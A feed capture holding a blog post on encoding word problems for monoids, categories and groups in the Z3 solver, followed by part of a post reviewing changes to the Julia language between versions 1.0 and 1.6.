February 14, 2021 | http://www.philipzucker.com/z3-and-the-word-problem/ | <a href="https://web.archive.org/web/*/http://www.philipzucker.com/z3-and-the-word-problem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>There‚Äôs a neat little trick I realized for encoding certain kinds of problems related to rewriting strings into Z3 somewhat elegantly. It‚Äôs very simple too.</p>

<h3 id="the-word-problem">The Word Problem</h3>

<p>The <a href="https://en.wikipedia.org/wiki/Word_problem_(mathematics)">word problem</a> is figuring out if two strings can be made equal to each other with a pile of equations of substrings.
It can be thought of in different ways and shows up in different domains. One way to talking about it is as figuring out equivalaence for a finite presentation of a monoid. A finite presentation gives generators a,b,c let‚Äôs say. The free monoid of these generators is just the strings you can make out these characters. The identity is the empty string and the monoid product is string concatenation. In a finite presentation, you also specify some equations like $ab=c$. Now it isn‚Äôt obvious when two strings are equal or not.</p>

<p>There is however an obvious strategy to find equality. Just search. You can consider each string a node in a graph and each application of an equality somewhere in the string to be an edge on that graph. Keep trying equalities using Dijsktra‚Äôs algorithm, A* or what have you and then if you find a path connecting the two words, you proved equality.</p>

<p>A more satisfactory solution is to use a completion algorithm like <a href="https://en.wikipedia.org/wiki/Knuth%E2%80%93Bendix_completion_algorithm">Knuth Bendix</a>. If Knuth bendix succeeds (a big if), the problem is in some sense solved for all words on the system. The output of the algorithm is a set of rewrite rules that bring words to a canonical form. You can just canonize words and compare to determine equality or disequality.</p>

<p>There are different approaches one might be inclined to take when modelling monoids in Z3. Z3 has a built in theory of strings, perhaps one could use arrays somehow, or one might axiomatize the theory directly using an uninterpeted sort like so.</p>

<div><div><pre><code><span>from</span> <span>z3</span> <span>import</span> <span>*</span>
<span>G</span> <span>=</span> <span>DeclareSort</span><span>(</span><span>"G"</span><span>)</span>
<span>e</span><span>,</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span> <span>=</span> <span>Consts</span><span>(</span><span>"e a b c"</span><span>,</span> <span>G</span><span>)</span>
<span>times</span> <span>=</span> <span>Function</span><span>(</span><span>'*'</span><span>,</span> <span>G</span><span>,</span><span>G</span><span>,</span> <span>G</span><span>)</span>

<span>monoid_axioms</span> <span>=</span> <span>[</span>
  <span>ForAll</span><span>([</span><span>a</span><span>],</span> <span>times</span><span>(</span><span>e</span><span>,</span><span>a</span><span>)</span> <span>==</span> <span>a</span> <span>),</span>
  <span>ForAll</span><span>([</span><span>a</span><span>],</span> <span>times</span><span>(</span><span>a</span><span>,</span><span>e</span><span>)</span> <span>==</span> <span>a</span> <span>),</span>
  <span>ForAll</span><span>([</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>]</span> <span>,</span> <span>times</span><span>(</span><span>a</span><span>,</span><span>times</span><span>(</span><span>b</span><span>,</span><span>c</span><span>))</span> <span>==</span> <span>times</span><span>(</span><span>times</span><span>(</span><span>a</span><span>,</span><span>b</span><span>),</span><span>c</span><span>))</span>
<span>]</span>

</code></pre></div></div>

<p>Axiomatizing the sort literally transcribes the axioms of a monoid. The thing that isn‚Äôt great about this is that the associativity law of the monoid is a derivation and you‚Äôre going to waste Z3‚Äôs energy on reasoning about trivial facts of associativity. It is preferable to have Z3 reason about something that is associative on the nose.</p>

<p>Well, there is a neat trick. The big thing that is associative on the nose is function composition. Instead of representing monoid elements as objects $a : G$, we represent them by a partial application of the monoid product $\hat{a} : G \rightarrow G = a\cdot -$ . We can always turn this representation back by applying it to the identity of the monoid $e : G$. This representation is associative on the nose for Z3.</p>

<p>We can make the presentation a little cuter to use by making a class that overloads multiplication and equality. Here we show a monoid generated by an element $a$ and with a quotienting equation $a^5 = a^2$.</p>

<div><div><pre><code><span>class</span> <span>Fun</span><span>():</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>f</span><span>):</span>
        <span>self</span><span>.</span><span>f</span> <span>=</span> <span>f</span>
    <span>def</span> <span>__mul__</span><span>(</span><span>self</span><span>,</span><span>g</span><span>):</span>
        <span>return</span> <span>Fun</span><span>(</span><span>lambda</span> <span>x</span> <span>:</span> <span>self</span><span>.</span><span>f</span><span>(</span><span>g</span><span>(</span><span>x</span><span>)))</span>
    <span>def</span> <span>__eq__</span><span>(</span><span>self</span><span>,</span><span>g</span><span>):</span>
        <span>G</span> <span>=</span> <span>DeclareSort</span><span>(</span><span>"G"</span><span>)</span>
        <span>x</span> <span>=</span> <span>Const</span><span>(</span><span>"x"</span><span>,</span> <span>G</span><span>)</span>
        <span>return</span> <span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>self</span><span>.</span><span>f</span><span>(</span><span>x</span><span>)</span> <span>==</span> <span>g</span><span>(</span><span>x</span><span>))</span>
    <span>def</span> <span>__call__</span><span>(</span><span>self</span><span>,</span><span>x</span><span>):</span>
        <span>return</span> <span>self</span><span>.</span><span>f</span><span>(</span><span>x</span><span>)</span>
    <span>def</span> <span>__pow__</span><span>(</span><span>self</span><span>,</span><span>n</span><span>):</span>
        <span>if</span> <span>n</span> <span>==</span> <span>0</span><span>:</span>
            <span>return</span> <span>Fun</span><span>(</span><span>lambda</span> <span>x</span> <span>:</span> <span>x</span><span>)</span>
        <span>return</span> <span>self</span> <span>*</span> <span>(</span><span>self</span> <span>**</span> <span>(</span><span>n</span><span>-</span><span>1</span><span>))</span>

<span>G</span> <span>=</span> <span>DeclareSort</span><span>(</span><span>"G"</span><span>)</span>
<span>a</span> <span>=</span> <span>Fun</span><span>(</span><span>Function</span><span>(</span><span>"a"</span><span>,</span> <span>G</span><span>,</span> <span>G</span><span>))</span>

<span>axioms</span> <span>=</span> <span>[</span><span>a</span> <span>**</span> <span>5</span> <span>==</span> <span>a</span><span>**</span><span>2</span><span>]</span> 

<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>axioms</span><span>)</span>
<span>s</span><span>.</span><span>add</span><span>(</span> <span>Not</span><span>(</span> <span>a</span><span>**</span><span>6</span> <span>==</span> <span>a</span><span>**</span><span>3</span><span>)</span>  <span>)</span> <span># prove a**6 == a**3
</span><span>s</span><span>.</span><span>check</span><span>()</span>
</code></pre></div></div>

<p>Viewed through a certain light it is another manifestation of the ole Hughes List/Cayley representation/Yoneda lemma thing, the gift that keeps on giving. The basic idea is to partially apply append/multiply/compose. It turns out the be useful to do in pragmatic programming context so because then things are associated in one direction by default instead of dealing with all possible associations. Some associations are better than others computationally, or it‚Äôs nice to just have a canonical form as in this case. As it manifests in Z3, we represent monoid elements as single argument uninterpreted functions rather than as constants.</p>

<p>This representation also shows up in explaining how string rewriting can be easily emulated by term rewriting. The standard recipe says to convert each symbol of the string system into a single argument term. $a \implies a(X)$. Then convert the string rewrite rule abc -&gt; bc becomes the term rewriting rule $a(b(c(X))) \rightarrow b(c(X))$, which is the same as the above.</p>

<h3 id="finitely-presented-categories">Finitely Presented Categories</h3>

<p>This trick extends to categories. We can represent morphism equality checking of finitely presented categories in this style. The only change to the monoid case is that it seems conceptually cleaner that we want to make different Z3 sorts for the morphisms to go between, representing the objects of the category.
This transformation is probably a manifestation of the Yoneda Embedding, by analogy to the other examples that I do somewhat understand.
Here is a simple category with 2 objects, and generated by 2 morphisms $f : A \rightarrow B$ and $g : B \rightarrow A $ with the equation $f \cdot g \cdot f \cdot g = id$</p>

<div><div><pre><code><span># Hey Julia this time. Why not.</span>
<span>using</span> <span>PyCall</span>
<span>z3</span> <span>=</span> <span>pyimport</span><span>(</span><span>"z3"</span><span>)</span>

<span>ob</span> <span>=</span> <span>[</span><span>z3</span><span>.</span><span>DeclareSort</span><span>(</span><span>"Hom(-,A)"</span><span>)</span> <span>,</span> <span>z3</span><span>.</span><span>DeclareSort</span><span>(</span><span>"Hom(-,B)"</span><span>)]</span>
<span>f</span> <span>=</span> <span>z3</span><span>.</span><span>Function</span><span>(</span><span>"f"</span><span>,</span> <span>ob</span><span>[</span><span>1</span><span>],</span> <span>ob</span><span>[</span><span>2</span><span>])</span>
<span>g</span> <span>=</span> <span>z3</span><span>.</span><span>Function</span><span>(</span><span>"g"</span><span>,</span> <span>ob</span><span>[</span><span>2</span><span>],</span> <span>ob</span><span>[</span><span>1</span><span>])</span>
<span>x</span> <span>=</span> <span>z3</span><span>.</span><span>Const</span><span>(</span><span>"x"</span><span>,</span> <span>ob</span><span>[</span><span>2</span><span>])</span>
<span>axiom</span> <span>=</span> <span>z3</span><span>.</span><span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>f</span><span>(</span><span>g</span><span>(</span><span>f</span><span>(</span><span>g</span><span>(</span><span>x</span><span>))))</span> <span>==</span> <span>x</span><span>)</span> <span># an equality over the morphism generators</span>

<span>s</span> <span>=</span> <span>z3</span><span>.</span><span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>axiom</span><span>)</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>z3</span><span>.</span><span>Not</span><span>(</span> <span>g</span><span>(</span><span>f</span><span>(</span><span>g</span><span>(</span><span>f</span><span>(</span><span>g</span><span>(</span><span>x</span><span>)))))</span> <span>==</span> <span>g</span><span>(</span><span>x</span><span>)</span> <span>))</span> <span># example simple theorem</span>
<span>s</span><span>.</span><span>check</span><span>()</span>
</code></pre></div></div>

<h3 id="groups">Groups</h3>
<p>The trick can also extend to groups, although dealing with the inverse operation of the group ruins the cleanliness. For every group element we add, we also need to add its inverse and some axioms about its inverse. So it isn‚Äôt quite as clean as a monoid.</p>

<div><div><pre><code><span>class</span> <span>Fun</span><span>():</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>f</span><span>,</span> <span>inv</span><span>):</span>
        <span>self</span><span>.</span><span>f</span> <span>=</span> <span>f</span>
        <span>self</span><span>.</span><span>inv</span> <span>=</span> <span>inv</span>
    <span>def</span> <span>__mul__</span><span>(</span><span>self</span><span>,</span><span>g</span><span>):</span>
        <span>return</span> <span>Fun</span><span>(</span><span>lambda</span> <span>x</span> <span>:</span> <span>self</span><span>.</span><span>f</span><span>(</span><span>g</span><span>(</span><span>x</span><span>)),</span> <span>lambda</span> <span>x</span> <span>:</span> <span>g</span><span>.</span><span>inv</span><span>(</span><span>self</span><span>.</span><span>inv</span><span>(</span><span>x</span><span>))</span> <span>)</span>
    <span>def</span> <span>__eq__</span><span>(</span><span>self</span><span>,</span><span>g</span><span>):</span>
        <span>G</span> <span>=</span> <span>DeclareSort</span><span>(</span><span>"G"</span><span>)</span>
        <span>x</span> <span>=</span> <span>Const</span><span>(</span><span>"x"</span><span>,</span> <span>G</span><span>)</span>
        <span>return</span> <span>And</span><span>(</span><span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>self</span><span>.</span><span>f</span><span>(</span><span>x</span><span>)</span> <span>==</span> <span>g</span><span>.</span><span>f</span><span>(</span><span>x</span><span>)),</span> <span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>self</span><span>.</span><span>inv</span><span>(</span><span>x</span><span>)</span> <span>==</span> <span>g</span><span>.</span><span>inv</span><span>(</span><span>x</span><span>)))</span>

    <span>def</span> <span>inv</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>Fun</span><span>(</span> <span>self</span><span>.</span><span>inv</span><span>,</span> <span>self</span><span>.</span><span>f</span> <span>)</span>
    <span>def</span> <span>__call__</span><span>(</span><span>self</span><span>,</span><span>x</span><span>):</span>
        <span>return</span> <span>self</span><span>.</span><span>f</span><span>(</span><span>x</span><span>)</span>
    <span>def</span> <span>__pow__</span><span>(</span><span>self</span><span>,</span><span>n</span><span>):</span>
        <span>if</span> <span>n</span> <span>==</span> <span>0</span><span>:</span>
            <span>return</span> <span>self</span><span>.</span><span>id</span>
        <span>return</span> <span>self</span> <span>*</span> <span>(</span><span>self</span> <span>**</span> <span>(</span><span>n</span><span>-</span><span>1</span><span>))</span>
    <span>def</span> <span>inv_axioms</span><span>(</span><span>self</span><span>):</span>
        <span>G</span> <span>=</span> <span>DeclareSort</span><span>(</span><span>"G"</span><span>)</span>
        <span>x</span> <span>=</span> <span>Const</span><span>(</span><span>"x"</span><span>,</span> <span>G</span><span>)</span>
        <span>return</span> <span>And</span><span>(</span><span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>self</span><span>.</span><span>f</span><span>(</span><span>self</span><span>.</span><span>inv</span><span>(</span><span>x</span><span>))</span> <span>==</span> <span>x</span><span>),</span> <span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>self</span><span>.</span><span>inv</span><span>(</span><span>self</span><span>.</span><span>f</span><span>(</span><span>x</span><span>))</span> <span>==</span> <span>x</span><span>)</span> <span>)</span>
    
<span>Fun</span><span>.</span><span>id</span> <span>=</span> <span>Fun</span><span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span><span>,</span> <span>lambda</span> <span>x</span><span>:</span> <span>x</span><span>)</span>
<span>def</span> <span>GroupElem</span><span>(</span><span>name</span><span>):</span>
    <span>return</span> <span>Fun</span><span>(</span><span>Function</span><span>(</span><span>name</span><span>,</span><span>G</span><span>,</span><span>G</span><span>),</span> <span>Function</span><span>(</span><span>f</span><span>"inv_</span><span>{</span><span>name</span><span>}</span><span>"</span><span>,</span><span>G</span><span>,</span><span>G</span><span>))</span>


<span># Symmetric group
</span><span>N</span> <span>=</span> <span>3</span>
<span>sigma</span> <span>=</span> <span>[</span><span>GroupElem</span><span>(</span><span>i</span><span>)</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>N</span><span>)]</span>

<span>axioms</span> <span>=</span> <span>[</span><span>s</span><span>.</span><span>inv_axioms</span><span>()</span> <span>for</span> <span>s</span> <span>in</span> <span>sigma</span><span>]</span>
<span>axioms</span> <span>+=</span> <span>[</span> <span>sigma</span><span>[</span><span>i</span><span>]</span><span>*</span><span>sigma</span><span>[</span><span>i</span><span>]</span> <span>==</span> <span>Fun</span><span>.</span><span>id</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>N</span><span>)</span> <span>]</span>
<span>axioms</span> <span>+=</span> <span>[</span> <span>sigma</span><span>[</span><span>i</span><span>]</span><span>*</span><span>sigma</span><span>[</span><span>j</span><span>]</span> <span>==</span> <span>sigma</span><span>[</span><span>j</span><span>]</span> <span>*</span> <span>sigma</span><span>[</span><span>i</span><span>]</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>N</span><span>)</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>i</span><span>-</span><span>1</span><span>)]</span>
<span>axioms</span> <span>+=</span> <span>[</span> <span>sigma</span><span>[</span><span>i</span><span>]</span><span>*</span><span>sigma</span><span>[</span><span>i</span><span>+</span><span>1</span><span>]</span><span>*</span><span>sigma</span><span>[</span><span>i</span><span>]</span> <span>==</span> <span>sigma</span><span>[</span><span>i</span><span>+</span><span>1</span><span>]</span> <span>*</span> <span>sigma</span><span>[</span><span>i</span><span>]</span> <span>*</span> <span>sigma</span><span>[</span><span>i</span><span>+</span><span>1</span><span>]</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>N</span><span>-</span><span>1</span><span>)</span>  <span>]</span>


<span># A braid group
# A nice way to detangle knots with egg?
</span><span>N</span> <span>=</span> <span>3</span>
<span>sigma</span> <span>=</span> <span>[</span><span>GroupElem</span><span>(</span><span>f</span><span>"sigma_</span><span>{</span><span>i</span><span>}</span><span>"</span><span>)</span><span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>N</span><span>)]</span>

<span>axioms</span> <span>=</span> <span>[</span><span>s</span><span>.</span><span>inv_axioms</span><span>()</span> <span>for</span> <span>s</span> <span>in</span> <span>sigma</span><span>]</span>
<span>axioms</span> <span>+=</span> <span>[</span> <span>sigma</span><span>[</span><span>i</span><span>]</span><span>*</span><span>sigma</span><span>[</span><span>j</span><span>]</span> <span>==</span> <span>sigma</span><span>[</span><span>j</span><span>]</span> <span>*</span> <span>sigma</span><span>[</span><span>i</span><span>]</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>N</span><span>)</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>i</span><span>-</span><span>1</span><span>)]</span>
<span>axioms</span> <span>+=</span> <span>[</span> <span>sigma</span><span>[</span><span>i</span><span>]</span><span>*</span><span>sigma</span><span>[</span><span>i</span><span>+</span><span>1</span><span>]</span><span>*</span><span>sigma</span><span>[</span><span>i</span><span>]</span> <span>==</span> <span>sigma</span><span>[</span><span>i</span><span>+</span><span>1</span><span>]</span> <span>*</span> <span>sigma</span><span>[</span><span>i</span><span>]</span> <span>*</span> <span>sigma</span><span>[</span><span>i</span><span>+</span><span>1</span><span>]</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>N</span><span>-</span><span>1</span><span>)</span>  <span>]</span>
</code></pre></div></div>

<h3 id="path-connectivity">Path Connectivity</h3>

<p>Here is another example where an encoding allows us to greatly change the ease with which Z3 handles a problem. This example feels a little different from the others, or is it?</p>

<p>Naively one might try to encode path connectivity of two vertices using a predicate <code>connected</code></p>

<div><div><pre><code><span>Point</span> <span>=</span> <span>DeclareSort</span><span>(</span><span>"Point"</span><span>)</span>
<span>connected</span> <span>=</span> <span>Function</span><span>(</span><span>"connected"</span><span>,</span> <span>Point</span><span>,</span> <span>Point</span><span>,</span> <span>Bool</span><span>)</span>
<span>#This defines a predicate that says if a point is connected to another.
</span>
<span>axioms</span> <span>=</span> <span>[]</span>
<span>#paths are invertible
</span><span>axioms</span> <span>+=</span> <span>ForAll</span><span>([</span><span>x</span><span>,</span><span>y</span><span>],</span> <span>path</span><span>(</span><span>a</span><span>,</span><span>b</span><span>)</span> <span>==</span> <span>connected</span><span>(</span><span>b</span><span>,</span><span>a</span><span>))</span>

<span># transitivity
</span><span>axioms</span> <span>+=</span> <span>ForAll</span><span>([</span><span>x</span><span>,</span><span>y</span><span>,</span><span>z</span><span>],</span> <span>Implies</span><span>(</span> <span>And</span><span>(</span><span>connected</span><span>(</span><span>x</span><span>,</span><span>y</span><span>)</span> <span>,</span> <span>connected</span><span>(</span><span>y</span><span>,</span><span>z</span><span>)</span> <span>)</span> <span>,</span> <span>connected</span><span>(</span><span>x</span><span>,</span><span>z</span><span>)</span> <span>))</span>

<span># self paths.
</span><span>axioms</span> <span>+=</span> <span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>connected</span><span>(</span><span>x</span><span>,</span><span>x</span><span>))</span>
</code></pre></div></div>

<p>Built in equality already <em>has</em> these properties though. Equality is backed by more or less a disjoint set data structure which is a very efficient way to calculate the connected sets of a graph.</p>

<p>I can guarantee you that this formulation will work better.</p>

<div><div><pre><code><span>import</span> <span>networkx</span> <span>as</span> <span>nx</span>

<span>G</span> <span>=</span> <span>nx</span><span>.</span><span>Graph</span><span>()</span>
<span>G</span><span>.</span><span>add_nodes</span><span>([</span><span>'a'</span><span>,</span><span>'b'</span><span>,</span><span>'c'</span><span>,</span><span>'d'</span><span>])</span>
<span>G</span><span>.</span><span>add_edges</span><span>(</span> <span>[(</span><span>'a'</span><span>,</span><span>'b'</span><span>),</span> <span>(</span><span>'b'</span><span>,</span><span>'c'</span><span>),</span> <span>(</span><span>'c'</span><span>,</span><span>'d'</span><span>)</span> <span>]</span> <span>)</span>
<span>G</span><span>.</span><span>connected_components</span>
</code></pre></div></div>

<div><div><pre><code><span>Vertex</span> <span>=</span> <span>DeclareSort</span><span>(</span><span>"Vertex"</span><span>)</span>
<span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,</span><span>d</span> <span>=</span> <span>Consts</span><span>(</span><span>"a b c d"</span><span>,</span> <span>Vertex</span><span>)</span>

<span>edges</span> <span>=</span> <span>[</span><span>a</span> <span>==</span> <span>b</span><span>,</span> <span>b</span> <span>==</span> <span>c</span><span>,</span> <span>c</span> <span>==</span> <span>d</span><span>]</span>

<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>edges</span><span>)</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>a</span> <span>!=</span> <span>d</span><span>)</span>
<span>s</span><span>.</span><span>check</span><span>()</span> <span># unsat means a and d are connected 
</span></code></pre></div></div>

<h3 id="path-homotopy">Path Homotopy</h3>

<p>The paths through the triangulation of a surface form a category with vertices as objects and paths as morphisms. <a href="https://en.wikipedia.org/wiki/Homotopy">Homotopically</a> equivalent paths also form a category, a <a href="https://en.wikipedia.org/wiki/Groupoid">groupoid</a> even.</p>

<p>This is to the group example what the Category example was to the monoid.</p>

<p>There is something very tickling about using Z3 equality to express homotopy equivalence. It is very vaguely reminiscent of things that occur Homotopy Type Theory, but I wouldn‚Äôt take that too seriously.</p>

<h3 id="bits-and-bobbles">Bits and Bobbles</h3>

<p>The underlying data structure here is the Egraph. Specializing EGraphs to single arguments terms might give something interesting. Also then we open up the ability to mix in Tries.</p>

<p>How do you prove two things are <em>not</em> equal? Find a model?</p>

<p>How to deal with higher homotopies? Does the existence of cubical type theory suggest in some sense that a data structure for binding forms (de bruijn perhaps ) is a useful but unexpected one for describing concrete homotopies on concrete triangulations.</p>

<p>Using egg <a href="https://egraphs-good.github.io/">https://egraphs-good.github.io/</a> for braid groups. Braid groups have applications in topological quantum computation. Optimizer?</p>

<p>2-ho‚Ä¶</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.philipzucker.com/z3-and-the-word-problem/">http://www.philipzucker.com/z3-and-the-word-problem/</a></em></p>]]>
            </description>
            <link>http://www.philipzucker.com/z3-and-the-word-problem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132818</guid>
            <pubDate>Sun, 14 Feb 2021 14:48:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Julia 1.6: what has changed since Julia 1.0?]]>
            </title>
            <description>
<![CDATA[
Score 244 | Comments 196 (<a href="https://news.ycombinator.com/item?id=26132801">thread link</a>) | @Sukera
<br/>
February 14, 2021 | https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html | <a href="https://web.archive.org/web/*/https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content">
      <p>Julia 1.0 came out well over 2 years ago.
Since then a lot has changed and a lot hasn‚Äôt.
Julia 1.0 was a commitment to no breaking changes, 
but that is not to say no new features have been added to the language.</p>

<!--more-->

<nav id="toc"></nav>

<p>Julia 1.6 is a huge release and it is coming out relatively soon.
RC-1 was <a href="https://discourse.julialang.org/t/julia-v1-6-0-rc1-is-now-available/54775">released recently</a>.
I suspect we have at least a few more weeks before the final release.
The Julia Core team take a huge amount of care in not breaking any packages.
So while that is all being checked and corner cases fixed, I think we have some time.
Thus this post, reflecting not just on 1.6, but on everything that has happened since the 1.0 release.</p>

<p>Julia 1.6 will be the first ‚Äúfeature‚Äù release since 1.0.
Prior to 1.0, all releases were feature releases; they came out when they were ready.
Since then, all releases (except 1.6) have been timed releases.
The release candidate is cut from the main branch every 3 months; and they are released after an <a href="https://github.com/JuliaLang/julia/pull/35846">extensive round of additional checking</a>, which often takes weeks to months.
Julia 1.6 was soft-slated to be the new long-term-support (LTS) version that would have bug-fixes backported to it for the next few years.
The current LTS is Julia 1.0, which has now had 5 patch releases made.
Since it was going to be supported for a long-time, people wanted to make sure everything good got in; thus it was a feature release.
The core developers have demurred on if 1.6 will actually be selected to be the new LTS (even if it is selected, it won‚Äôt ascend to being the LTS til it stops being the current Stable).</p>

<p>My impression now is that they feel like it has too many cool new things; and that a few things didn‚Äôt quite make it in even with the extended release cycle.
So it‚Äôs looking likely to me that 1.7 will actually be the LTS; but that it might also be a feature release ‚Äì possibly this time a much shorter release period than usual.
In practice I think for a lot of package maintainers 1.6 will be a LTS, in that that is the oldest version they will make sure to continue to support.
There have been too many cool new things (as this post will detail) to stay back to only 1.0 features.
Already a lot of packages have dropped support for Julia versions older than 1.3.</p>

<p>This post is kind of a follow-up to my <a href="https://www.oxinabox.net//2018/06/01/Julia-Favourite-New-Things.html">Julia 1.0 release run-down</a>.
But it‚Äôs going to be even longer, as it is covering the last 5 releases since then and I am not skipping the major new features.
I am writing this not to break down release by release,
but to highlight features that, had you only used Julia 1.0, you wouldn‚Äôt have seen.
Full details can be found in the <a href="https://github.com/JuliaLang/julia/blob/backports-release-1.6/NEWS.md">NEWS.md</a>, and <a href="https://github.com/JuliaLang/julia/blob/backports-release-1.6/HISTORY.md">HISTORY.md</a></p>

<h2 id="front-end-changes">Front-end changes</h2>
<h3 id="soft-scope-in-the-repl">Soft-scope in the REPL</h3>
<p>Julia 1.0 removed the notion of soft-scope from the language.
I was very blas√© about the change to for-loop bindings in my <a href="https://www.oxinabox.net/2018/06/01/Julia-Favourite-New-Things.html#for-loop-variable-binding-changes">1.0 release post</a>.
In fact, I didn‚Äôt even mention this particular change.
It was <a href="https://github.com/JuliaLang/julia/pull/19324">#19324</a> for reference.</p>

<p>This was undone in in Julia 1.5 with <a href="https://github.com/JuliaLang/julia/pull/33864">#33864</a> for the REPL only.
Now in the REPL, assigning to a global variable within a for-loop actually assigns that variable, rather than shadowing it with a new variable in that scope.
The same behavior outside the REPL now gives a warning.</p>

<p>Personally, this change never affected me because I never write for-loops that assign variables at global scope.
Indeed basically all code I write is inside functions.
But I do see how this causes problems for some interactive workflows, e.g. when demonstrating something.
See the <a href="https://github.com/JuliaLang/julia/issues/28789">main GitHub issue</a> and the longest <a href="https://discourse.julialang.org/t/another-possible-solution-to-the-global-scope-debacle/15894">Discourse thread</a>, though there were many others.
It took over a year of discussion to work out the solution, particularly because many of the more obvious solutions would be breaking in significant ways.</p>

<h3 id="deprecations-are-muted-by-default">Deprecations are muted by default</h3>

<p>Julia 1.5+ doesn‚Äôt display deprecation warnings, unless you run julia with the <code>--depwarn=yes</code> flag.
This was me in <a href="https://github.com/JuliaLang/julia/pull/35362">this PR</a>.
It‚Äôs not something I am super happy about, although I think it makes sense.
Using deprecated methods is actually fine, as long as your dependencies follow SemVer, and you use <code>^</code> (i.e. default) bounding in your Project.toml‚Äôs <code>[compat]</code>, which everyone does, because it‚Äôs enforced by the auto-merge script in the General registry.
Often it is even necessary if you want to keep compatibility for a while.</p>

<p>Solving deprecations is a thing you should actively choose to do rather than casually when trying to do something else.
In particular, when updating to support a new major release of one of your dependencies, you should follow a process.
Something like:</p>

<ol>
  <li>Check the release notes.</li>
  <li>Relax compat bounds</li>
  <li>Run your integration tests, if everything passes you are done.</li>
  <li>If tests failed, revert the change to compat bounds, then rerun your integration tests paying attention to deprecation warnings.</li>
</ol>

<p>Updating your dependencies should be an active choice.
Potentially one that is automated, but not one that you do while adding another feature (if you can help it).</p>

<p>The core of the reason we disabled them is because they were actually breaking things.
Irrelevant deprecation warning spam from dependencies of dependencies was causing JuMP and LightGraphs to become too slow to be used.
Further, since they were from dependencies of dependencies, the maintainers of JuMP and LightGraphs (let alone the end users) couldn‚Äôt even fix them.</p>

<p>Deprecation warnings are still turned on by default in tests, which makes sense since the tests (unlike normal use) are being run by maintainers of the package itself, not its users.
This however still doesn‚Äôt make a huge amount of sense to me, since spam from deprecation warnings floods out the actual errors that you want to see during testing.
For this reason, <a href="https://invenia.ca/">Invenia</a> (my employer) has disabled deprecation warnings in the CI tests for all our closed source packages, and added a new test job that just does deprecation checking (set to error on deprecation and with the job allowed to fail, just so we are informed).</p>

<p>Hopefully one day we can improve the tooling around deprecation warnings.
An ideal behavior would be to only show deprecation warnings if directly caused by a function call made from within the package module of your current active environment.
I kind of know what we need to do to the logger to make that possible, but it is not yet something I have had time to do.</p>

<h3 id="code-highlighting-for-code_llvm-and-code_native">Code highlighting for <code>code_llvm</code> and <code>code_native</code></h3>
<p>This was added in <a href="https://github.com/JuliaLang/julia/issues/36634">#36634</a>.
This functionality was first implemented in <a href="https://github.com/kimikage/ColoredLLCodes.jl">ColoredLLCodes.jl</a>, where it worked by monkey-patching the InteractiveUtils stdlib.
That package does still work on Julia 1.0.</p>

<p><strong>Julia 1.0:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.0-code-llvm.png" alt="Julia 1.0 code_llvm"></p>

<p><strong>Julia 1.6:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.6-code-llvm.png" alt="Julia 1.6 code_llvm"></p>

<p>The REPL itself still doesn‚Äôt have syntax highlighting for Julia code though.
The <a href="https://github.com/KristofferC/OhMyREPL.jl">OhMyRepl</a> package does provide that, and works for all versions of Julia.
It is a lot more than a series of regexes though, so I don‚Äôt think we are going to see it built into Julia too soon.
Probably one day, though, as its big dependencies are also required if the parser wants to move to be written in Julia (though I also don‚Äôt expect that any time soon).</p>

<h3 id="clearer-stacktraces">Clearer Stacktraces</h3>

<p>Just like colored <code>code_llvm</code>, colored stack-traces also originated in a package that was doing some nasty monkey-patching: <a href="https://github.com/jkrumbiegel/ClearStacktrace.jl">ClearStacktrace.jl</a>.
This was added into Base itself in <a href="https://github.com/JuliaLang/julia/pull/36134">#36134</a>.</p>

<p><strong>Julia 1.0:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.0-stacktrace.png" alt="Julia 1.0 stacktrace"></p>

<p><strong>Julia 1.6:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.6-stacktrace.png" alt="Julia 1.6 stacktrace"></p>

<p>The first thing you probably notice is the colored package names, to make it more clear where the error is coming from.
